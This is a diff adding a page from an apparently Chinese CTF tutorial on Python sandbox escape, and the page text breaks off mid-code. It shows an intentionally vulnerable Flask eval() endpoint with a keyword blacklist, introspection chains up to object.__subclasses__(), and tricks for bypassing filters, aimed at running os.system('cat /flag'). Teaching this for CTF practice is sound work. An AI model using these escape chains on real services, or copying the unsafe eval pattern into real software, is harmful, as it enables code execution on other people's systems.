@@ -1,0 +1,1463 @@
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh" dir="ltr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+    <title>Python沙箱逃逸 | Hello CTF</title>
+  
+  <meta name="description" content="开源免费、新手友好的CTF(Capture The Flag,夺旗赛)入门教程">
+  <link rel="icon" href="../../assets/images/favicon.png">
+
+  <!-- 字体（与首页同源） -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Noto+Sans+SC:wght@400;500;700;800&display=swap" rel="stylesheet">
+
+  <!-- material 文章排版 CSS（pin 9.7.7 的 hash 文件名，升级主题时同步更新） -->
+  <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+  <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+
+  <!-- Hello-CTF 外壳 -->
+  <link rel="stylesheet" href="../../shell/shell.css">
+  <link rel="stylesheet" href="../../shell/shell-docs.css">
+  <link rel="stylesheet" href="../../shell/shell-article.css">
+
+  <!-- 站点原有 extra_css（katex CDN / extra.css / bannerSlider.css 等） -->
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css">
+  
+    <link rel="stylesheet" href="../../stylesheets/extra.css">
+  
+
+  <!-- admonition 等组件的图标 SVG 变量（原由 material base.html 注入） -->
+  
+
+
+
+  
+  
+  
+
+<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-V9998CDNR1"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-V9998CDNR1",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-V9998CDNR1",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
+</head>
+<body data-md-color-scheme="default">
+
+  <!-- 主题初始化（先于渲染，避免闪烁）：hc-theme → shell data-theme + material slate -->
+  <script>
+    (function () {
+      var t = null;
+      try { t = localStorage.getItem("hc-theme"); } catch (e) {}
+      if (t) {
+        document.documentElement.dataset.theme = t;
+        document.body.setAttribute("data-md-color-scheme", t === "dark" ? "slate" : "default");
+      }
+    })();
+    window.__md_palette_sync = function (t) {
+      document.body.setAttribute("data-md-color-scheme", t === "dark" ? "slate" : "default");
+    };
+  </script>
+
+  <script src="../../shell/search.js"></script>
+  <script src="../../shell/shell.js"></script>
+  <script>Shell.mount({ active: "" });</script>
+
+  <!-- 主区：顶部文档导航 + 文章 + TOC -->
+  <div class="main">
+    <nav class="hc-topnav" aria-label="文档导航">
+      <div class="hc-topnav-inner">
+        
+          
+          
+            <a class="tn-item tn-single" href="../../hc-start/"><svg class="ic tn-ico"><use href="#i-book"/></svg>快速开始</a>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-book"/></svg>前言<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-preface/">前言</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/about/">关于本书</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/usage/">食用方法</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/join/">加入我们</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-puzzle"/></svg>MISC<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-misc/">MISC | 杂项</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/osint/">信息收集</a>
+    
+  
+    
+      <div class="tn-group">文件与编码基础</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-misc/Encode_extra/">编码扩展</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file/">文件基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/Archivefile/">压缩包</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">隐写分析</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-misc/stego/">图片隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file_stego/">文件隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/audio_stego/">音频隐写</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">取证分析</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-misc/pcap/">流量分析</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/memory/">内存取证</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/industrial/">工控类</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file_sign/">附:文件签名表</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item on">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-globe"/></svg>Web<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../">Web | 网络攻防</a>
+    
+  
+    
+      <div class="tn-group">环境与工具</div>
+      
+  
+    
+      <a class="tn-link" href="../web_env/">Web环境设置</a>
+    
+  
+    
+      <a class="tn-link" href="../docker_install/">Docker安装配置</a>
+    
+  
+    
+      <a class="tn-link" href="../docker_env/">Docker与漏洞环境</a>
+    
+  
+    
+      <a class="tn-link" href="../vm_lab/">虚拟机与网络模拟</a>
+    
+  
+    
+      <a class="tn-link" href="../burp/">Burp Suite</a>
+    
+  
+    
+      <a class="tn-link" href="../py_script/">Python脚本</a>
+    
+  
+    
+      <a class="tn-link" href="../http/">HTTP协议</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../web_start/">Web入门题单</a>
+    
+  
+    
+      <div class="tn-group">信息收集</div>
+      
+  
+    
+      <a class="tn-link" href="../sensitive_info/">敏感信息泄露</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">PHP专题</div>
+      
+  
+    
+      <a class="tn-link" href="../php_features/">PHP特性与常见绕过</a>
+    
+  
+    
+      <a class="tn-link" href="../php_basic/">PHP基础</a>
+    
+  
+    
+      <a class="tn-link" href="../php_unser/">PHP反序列化</a>
+    
+  
+    
+      <a class="tn-link" href="../php_code_audit/">PHP代码审计</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">注入类漏洞</div>
+      
+  
+    
+      <a class="tn-link" href="../sql_injection/">SQL注入</a>
+    
+  
+    
+      <a class="tn-link" href="../nosql/">NoSQL注入</a>
+    
+  
+    
+      <a class="tn-link" href="../xss/">XSS攻击</a>
+    
+  
+    
+      <a class="tn-link" href="../csrf/">CSRF攻击</a>
+    
+  
+    
+      <a class="tn-link" href="../ssti/">SSTI注入</a>
+    
+  
+    
+      <a class="tn-link" href="../xxe/">XXE注入</a>
+    
+  
+    
+      <a class="tn-link" href="../ssrf/">SSRF注入</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">文件类漏洞</div>
+      
+  
+    
+      <a class="tn-link" href="../file_upload/">文件上传</a>
+    
+  
+    
+      <a class="tn-link" href="../include/">文件包含</a>
+    
+  
+    
+      <a class="tn-link" href="../dir_traversal/">目录穿越</a>
+    
+  
+    
+      <a class="tn-link" href="../any_file_read/">任意文件读取</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">命令与代码执行</div>
+      
+  
+    
+      <a class="tn-link" href="../rce/">RCE</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../session_jwt/">会话与认证安全</a>
+    
+  
+    
+      <a class="tn-link" href="../logical_vuln/">逻辑漏洞</a>
+    
+  
+    
+      <div class="tn-group">语言扩展 | 世界不止有PHP</div>
+      
+  
+    
+      <a class="tn-link" href="../py_unser/">Python反序列化</a>
+    
+  
+    
+      <a class="tn-link on" href="./">Python沙箱逃逸</a>
+    
+  
+    
+      <a class="tn-link" href="../flask_sec/">Flask安全</a>
+    
+  
+    
+      <a class="tn-link" href="../prototype_pollution/">原型链污染</a>
+    
+  
+    
+      <a class="tn-link" href="../js_sandbox/">JS沙箱逃逸</a>
+    
+  
+    
+      <a class="tn-link" href="../js_reverse/">JS逆向</a>
+    
+  
+    
+      <a class="tn-link" href="../java_basic/">Java安全基础</a>
+    
+  
+    
+      <a class="tn-link" href="../java_unser/">Java反序列化</a>
+    
+  
+    
+      <a class="tn-link" href="../spring/">Spring漏洞</a>
+    
+  
+    
+      <a class="tn-link" href="../java_audit/">Java代码审计</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">进阶专题</div>
+      
+  
+    
+      <a class="tn-link" href="../waf_bypass/">WAF绕过</a>
+    
+  
+    
+      <a class="tn-link" href="../http_smuggling/">请求走私</a>
+    
+  
+    
+      <a class="tn-link" href="../cache_poisoning/">缓存投毒</a>
+    
+  
+    
+      <a class="tn-link" href="../xs_leaks/">XS-Leaks</a>
+    
+  
+    
+      <a class="tn-link" href="../web_crypto/">密码学应用题</a>
+    
+  
+    
+      <a class="tn-link" href="../cloud_container/">云与容器安全</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">实战能力</div>
+      
+  
+    
+      <div class="tn-group">渗透链路基础</div>
+      
+  
+    
+      <a class="tn-link" href="../pentest_flow/">渗透流程总览</a>
+    
+  
+    
+      <a class="tn-link" href="../two_layer/">两层网络实战</a>
+    
+  
+    
+      <a class="tn-link" href="../foothold/">立足点建立</a>
+    
+  
+    
+      <a class="tn-link" href="../internal_recon/">内网信息收集</a>
+    
+  
+    
+      <a class="tn-link" href="../proxy_tunnel/">代理与隧道</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">多层网络渗透</div>
+      
+  
+    
+      <a class="tn-link" href="../three_layer/">三层网络实战</a>
+    
+  
+    
+      <a class="tn-link" href="../multi_layer/">多层网络综合</a>
+    
+  
+    
+      <a class="tn-link" href="../ad_basic/">域渗透入门</a>
+    
+  
+    
+      <a class="tn-link" href="../lateral/">横向移动</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">对抗与综合</div>
+      
+  
+    
+      <a class="tn-link" href="../awd/">AWD模式</a>
+    
+  
+    
+      <a class="tn-link" href="../web_pwn/">Web与二进制结合</a>
+    
+  
+    
+      <a class="tn-link" href="../nday/">Nday利用</a>
+    
+  
+    
+      <a class="tn-link" href="../review/">Writeup复盘方法</a>
+    
+  
+
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-lock"/></svg>Crypto<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-crypto/">Crypto | 密码学</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/env/">环境配置</a>
+    
+  
+    
+      <div class="tn-group">基础知识</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Recap/">前情提要</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Encode/">编码基础</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">密码体系</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Classicalcipher/">古典密码</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Moderncipher/">现代密码</a>
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-cpu"/></svg>Reverse<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-reverse/">逆向工程</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%BC%95%E5%AF%BC%E7%AF%87%EF%BC%9A%E7%81%B5%E9%AD%82FAQ/">引导篇：灵魂FAQ</a>
+    
+  
+    
+      <div class="tn-group">编译与可执行文件</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/">C语言基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/">存储结构</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Quick%20Start%EF%BC%9A%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/">可执行文件</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">交互式反汇编工具IDA</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/StartWithIDA/">从零开始的IDA</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/">IDA动态调试</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">常见算法</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%9F%BA%E6%9C%AC%E8%BF%90%E7%AE%97/">基本运算</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E7%BC%96%E7%A0%81%E5%9F%BA%E7%A1%80/">编码基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%AD%97%E8%8A%82%E6%B5%81%E7%AE%97%E6%B3%95/">字节流算法</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/">分组密码</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/z3%E7%BA%A6%E6%9D%9F%E6%B1%82%E8%A7%A3/">z3约束求解</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Quick%20Start%EF%BC%9AASM%E6%B1%87%E7%BC%96/">x86 汇编初步</a>
+    
+  
+    
+      <div class="tn-group">代码保护与对抗</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E8%8A%B1%E6%8C%87%E4%BB%A4/">花指令</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A3%B3/">加壳</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/VM/">VM</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/SMC/">SMC</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/">异常处理</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%A4%9A%E7%BA%BF%E7%A8%8B/">多线程</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/">TLS回调函数</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%8F%8D%E8%B0%83%E8%AF%95/">反调试</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/">控制流平坦化</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/">符号执行</a>
+    
+  
+    
+      <div class="tn-group">语言与框架</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Python/">Python</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/NET/">.NET</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Rust/">Rust</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/JavaScript/">JavaScript</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Android/">Android平台</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E8%A7%A3%E9%A2%98%E6%8A%80%E5%B7%A7/">解题技巧</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-terminal"/></svg>Pwn<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-pwn/">Pwn | 二进制安全</a>
+    
+  
+    
+      <div class="tn-group">环境与基础</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-pwn/wsl2_environment/">wsl2下的环境配置</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Asm_x86/">汇编语言(x86)</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Protections/">常见保护</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">栈溢出</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Stack_Overflow/">栈上数组越界&栈溢出</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">ROP利用</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-pwn/ROP/">ROP入门</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/ROP_Tricks/">常见的ROP技巧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/rop_add_v1/">ROP进阶</a>
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-shield"/></svg>AWD<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_about/">AWD介绍</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_platform/">AWD平台</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_web.exp/">【WEB】AWD技巧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_pwn.exp/">【PWN】AWD技巧</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-bot"/></svg>AI<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-ai/">AI | 人工智能</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-ai/What_is_AI/">初识AI</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-ai/MLP/">你的第一个神经网络</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-link"/></svg>区块链<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <div class="tn-group">Move</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x00/">从0开始的签到题</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x01/">独特的所有权</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x02/">神奇的时钟</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x03/">对象与燃气</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x04/">多样的泛型</a>
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-tag"/></svg>附录<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-appendix/how-to-ask/">提问的智慧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-appendix/NSSCTF_Usage/">NSSCTF平台使用</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-appendix/book/">推荐书单</a>
+    
+  
+</div>
+            </div>
+          
+        
+      </div>
+    </nav>
+    <div class="doc-layout">
+      <article class="md-typeset hc-article">
+        <!-- Tags -->
+
+
+<!-- Actions -->
+<!-- Actions -->
+
+
+  <!-- Edit button -->
+  
+
+  <!-- View button -->
+  
+
+
+<!-- Page content -->
+<div><h1 id="python">Python沙箱逃逸<a class="headerlink" href="#python" title="Permanent link">¶</a></h1>
+<p>在 CTF 的 Web 题里，经常会遇到一种「看起来能执行任意 Python 代码、实际上处处受限」的题目：服务器给你一个输入框，把你输入的内容丢进 <code>eval()</code> 或 <code>exec()</code> 执行，但又禁用了 <code>import</code>、<code>open</code>、<code>os</code> 等关键字。这类题就是 <strong>Python 沙箱逃逸（Python Sandbox Escape）</strong>。本章面向初学者，讲清它的原理和最常用的几条逃逸链，最后用一道典型例题走一遍完整流程。</p>
+<h2 id="python_1">什么是 Python 沙箱题<a class="headerlink" href="#python_1" title="Permanent link">¶</a></h2>
+<p>Python 是一门高度动态、自省能力极强的语言：任何对象都能查到自己的类，任何类都能查到自己的父类和子类，甚至能在运行期动态生成代码。这意味着，只要攻击者能在目标进程里执行 <strong>哪怕一个表达式</strong>，就有机会顺着对象体系爬到解释器的任意角落，最终拿到 <code>os.system</code> 之类的能力。</p>
+<p>出题人为了不让选手"一步到位"，通常会构造一个受限环境，常见手段有：</p>
+<ul>
+<li>只允许 <code>eval()</code>（只能执行单个表达式，不能写语句）；</li>
+<li>用正则黑名单过滤 <code>import</code>、<code>os</code>、<code>open</code>、<code>system</code> 等关键字；</li>
+<li>执行前清空 <code>__builtins__</code>，让你连 <code>print</code> 都用不了；</li>
+<li>把代码放进 <code>exec(code, {"__builtins__": {}})</code> 这样的"空"命名空间里执行。</li>
+</ul>
+<p>一个最简的沙箱题后端大概长这样：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">"/calc"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">"POST"</span><span class="p">])</span>
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="k">def</span><span class="w"> </span><span class="nf">calc</span><span class="p">():</span>
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>    <span class="n">expr</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"expr"</span><span class="p">,</span> <span class="s2">""</span><span class="p">)</span>
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>    <span class="n">blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s2">"import"</span><span class="p">,</span> <span class="s2">"os"</span><span class="p">,</span> <span class="s2">"open"</span><span class="p">,</span> <span class="s2">"eval"</span><span class="p">,</span> <span class="s2">"exec"</span><span class="p">,</span> <span class="s2">"__"</span><span class="p">]</span>
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>    <span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">blacklist</span><span class="p">:</span>
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>        <span class="k">if</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">expr</span><span class="p">:</span>
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>            <span class="k">return</span> <span class="s2">"hacker!"</span>
+<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>    <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="nb">eval</span><span class="p">(</span><span class="n">expr</span><span class="p">,</span> <span class="p">{</span><span class="s2">"__builtins__"</span><span class="p">:</span> <span class="p">{}}))</span>
+</code></pre></div>
+<p>沙箱逃逸的目标就是：在这些限制下，仍然执行到 <code>os.system("cat /flag")</code> 或等价操作。</p>
+<p><strong>安全提示：</strong> 本章所有技巧仅用于 CTF 比赛与授权测试环境。<code>eval</code>/<code>exec</code> 直接处理用户输入本身就是严重漏洞（参见「RCE」一章），真实业务中绝不要这么写。</p>
+<h2 id="_1">对象继承链基础<a class="headerlink" href="#_1" title="Permanent link">¶</a></h2>
+<p>逃逸的核心工具是 Python 的对象继承链。先记住一句话：<strong>在 Python 中万物皆对象，每个对象都能顺着属性找到它的类和所有兄弟类。</strong></p>
+<p>关键的内省属性有三个：</p>
+<table>
+<thead>
+<tr>
+<th>属性</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>__class__</code></td>
+<td>对象的类</td>
+</tr>
+<tr>
+<td><code>__base__</code></td>
+<td>类的直接父类（顶层是 <code>object</code>）</td>
+</tr>
+<tr>
+<td><code>__subclasses__()</code></td>
+<td>类的所有直接子类列表</td>
+</tr>
+</tbody>
+</table>
+<p>动手试一下，感受这条链：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="o">&gt;&gt;&gt;</span> <span class="s1">''</span><span class="o">.</span><span class="vm">__class__</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="o">&lt;</span><span class="k">class</span><span class="w"> </span><span class="err">'</span><span class="nc">str</span><span class="s1">'&gt;</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="o">&gt;&gt;&gt;</span> <span class="s1">''</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="o">&lt;</span><span class="k">class</span><span class="w"> </span><span class="err">'</span><span class="nc">object</span><span class="s1">'&gt;</span>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="o">&gt;&gt;&gt;</span> <span class="s1">''</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span>
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="p">[</span><span class="o">&lt;</span><span class="k">class</span><span class="w"> </span><span class="err">'</span><span class="nc">type</span><span class="s1">'&gt;, &lt;class '</span><span class="n">async_generator</span><span class="s1">'&gt;, &lt;class '</span><span class="n">bytearray_iterator</span><span class="s1">'&gt;, ...]</span>
+</code></pre></div>
+<p>最后一步返回的列表通常有上百项——它们是解释器启动时已经加载的 <strong>所有类</strong>。只要其中某个类（或它的方法）内部引用了 <code>os</code>、<code>sys</code>、<code>builtins</code> 等模块，我们就能借它摸到这些模块。</p>
+<p>由于题目经常过滤 <code>__</code>（双下划线），还要记住它的等价写法：</p>
+<ul>
+<li><code>getattr(x, "__class__")</code>，字符串可以再拆成 <code>"__cla"+"ss__"</code> 绕过关键字过滤；</li>
+<li><code>().__class__.__bases__[0]</code> 与 <code>__base__</code> 等价；</li>
+<li><code>object.__subclasses__()</code> 可以从任何对象爬过去，例如 <code>().__class__.__base__.__subclasses__()</code>。</li>
+</ul>
+<h2 id="_2">经典逃逸链讲解<a class="headerlink" href="#_2" title="Permanent link">¶</a></h2>
+<p>拿到 <code>__subclasses__()</code> 的列表后，要在里面找一个"能带我们到危险模块"的类。CTF 中最经典的几条链如下。</p>
+<h3 id="os_wrap_close">借助 <code>os._wrap_close</code><a class="headerlink" href="#os_wrap_close" title="Permanent link">¶</a></h3>
+<p><code>os</code> 模块在初始化时会注册一个 <code>os._wrap_close</code> 类（继承自 <code>io.IOBase</code>），它的 <code>__init__</code> 函数的 <code>__globals__</code> 里保存着 <code>os</code> 模块的全局命名空间：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="k">def</span><span class="w"> </span><span class="nf">search</span><span class="p">():</span>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="bp">cls</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="nb">object</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()):</span>
